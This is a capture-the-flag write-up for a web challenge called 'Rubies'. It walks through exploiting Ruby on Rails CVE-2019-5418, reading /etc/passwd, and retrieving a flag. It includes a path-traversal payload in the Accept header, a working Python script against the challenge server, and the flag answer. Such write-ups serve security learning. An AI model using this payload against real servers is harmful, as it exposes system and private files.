# Rubies

> **Category**: Web
> **Author**: Stefan

## TL;DR
Exploiting CVE-2019-5418

---

## Challenge Description
The challenge name was "rubies," and we had an image with a ruby. The website title, when base64 decoded, was "rails." Clicking on the image brought me to `/vuln` and returned a 500 server error.

![Writeup_image_1](https://i.imgur.com/G3dmPpJ.png)

## Solution
### Step 1: Identifying the CVE
After some investigation, I looked through the CVEs for Ruby on Rails on cvedetails.com but found nothing relevant. I then googled `ruby rails cve "poc"` (PoC – Proof of Concept), which led us to CVE-2019-5418.

### Step 2: Exploiting the Vulnerability
The vulnerable path was `/vuln`, and we found the [CVE-2019-5418 GitHub repository](https://github.com/mpgn/CVE-2019-5418). By changing the `Accept` header, we could retrieve files from the server.

![Writeup_image_2](https://i.imgur.com/MIHu9dr.png)

### Step 3: Finding the Flag
To identify the flag file path, I first looked into `/etc/passwd`, as the CVE example did. There, I found a user named "gem" with a corresponding home directory, suggesting that the flag might be in that directory.

The payload I used was `../../../../../../../home/gem/flag.txt{{`.

![Writeup_image_3](https://i.imgur.com/y06p0rb.png)

## Script
```python
import requests

url = "http://34.107.71.117:30786/vuln"
headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "../../../../../../../home/gem/flag.txt{{",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

response = requests.get(url, headers=headers)
print(response.text)
```

## Flag
`CTF{C5547BAA6CE135850B3A728D442925F1AE63F2BF22301676282958A0CE5FAE59}`